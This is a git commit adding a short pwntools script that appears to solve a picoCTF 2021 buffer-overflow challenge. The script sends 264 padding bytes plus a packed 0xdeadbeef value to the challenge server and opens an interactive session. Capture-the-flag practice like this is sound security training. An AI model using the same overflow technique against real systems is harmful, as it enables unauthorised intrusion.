0031d1d80c794a132e16875c1e2000c389b8fc9f
micahweiss25 <m.d.weiss25@gmail.com>
2021-11-20 16:58:48 -0500

    Added pwn script

---
+++ pico21/clutter_house/pwn_script.py
@@ -0,0 +1,12 @@
+from pwn import *
+
+offset = b'a'*264
+payload = '0xdeadbeef'
+payload = struct.pack('<Q', int(payload, base=16))
+pid = 15971
+s = remote("mars.picoctf.net",31890)
+# s = process("./clutter_overflow/chal")
+print(s.recvuntil("What do you see?"))
+s.sendline(offset+payload)
+s.interactive()
+gdb.attach(s, gdbscript='continue')
